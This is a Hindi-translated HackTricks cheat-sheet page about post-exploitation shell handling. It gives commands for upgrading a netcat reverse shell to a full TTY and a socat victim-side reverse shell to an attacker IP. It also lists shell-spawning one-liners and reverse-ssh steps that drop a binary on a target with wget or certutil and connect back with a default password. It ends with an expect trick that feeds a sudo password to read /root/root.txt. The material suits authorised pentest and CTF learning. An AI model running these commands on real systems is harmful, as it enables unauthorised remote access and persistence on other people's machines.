# पूर्ण TTYs

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## पूर्ण TTY

ध्यान दें कि जिस शैल आप `SHELL` चर में सेट करते हैं, **उसे** _**/etc/shells**_ **में सूचीबद्ध होना चाहिए** या `SHELL` चर के लिए मान _**/etc/shells**_ फ़ाइल में नहीं मिला गया था इस घटना की सूचना दी गई है। इसके अलावा, ध्यान दें कि अगले स्निपेट्स केवल बैश में काम करते हैं। यदि आप zsh में हैं, तो शेल को प्राप्त करने से पहले `bash` चलाने के लिए बैश में बदलें।

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
आप **`stty -a`** को निष्पादित करके **पंक्तियों** और **स्तंभों** की **संख्या** प्राप्त कर सकते हैं।
{% endhint %}

#### स्क्रिप्ट

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### सोकैट
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **शैल उत्पन्न करें**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## **रिवर्सएसएसएच**

**इंटरैक्टिव शैल एक्सेस**, साथ ही **फ़ाइल ट्रांसफ़र** और **पोर्ट फ़ॉरवर्डिंग** के लिए एक सुविधाजनक तरीका है, लक्षित पर एक स्थिर-लिंक्ड एसएसएच सर्वर [रिवर्सएसएसएच](https://github.com/Fahrj/reverse-ssh) को लक्षित पर छोड़ना।

नीचे एक उदाहरण है `x86` के लिए उपक्षिप्त बाइनरी के साथ। अन्य बाइनरी के लिए, [रिलीज़ पेज](https://github.com/Fahrj/reverse-ssh/releases/latest/) की जांच करें।

1. लोकली तैयारी करें ताकि एसएसएच पोर्ट फ़ॉरवर्डिंग अनुरोध को पकड़ सकें:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) लिनक्स लक्ष्य:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 लक्ष्य (पूर्व संस्करणों के लिए, [परियोजना readme](https://github.com/Fahrj/reverse-ssh#features) देखें): 

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
* यदि रिवर्स SSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा है, तो अब आपको `reverse-ssh(.exe)` चलाने वाले उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## कोई TTY नहीं

यदि किसी कारणवश आपको एक पूर्ण TTY प्राप्त नहीं हो सकता है, तो फिर भी आप **प्रोग्रामों के साथ बातचीत कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड `sudo` को फ़ाइल पढ़ने के लिए पारित किया जाता है:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{% hint style="success" %}
**AWS हैकिंग सीखें और अभ्यास करें:**<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
**GCP हैकिंग सीखें और अभ्यास करें:** <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
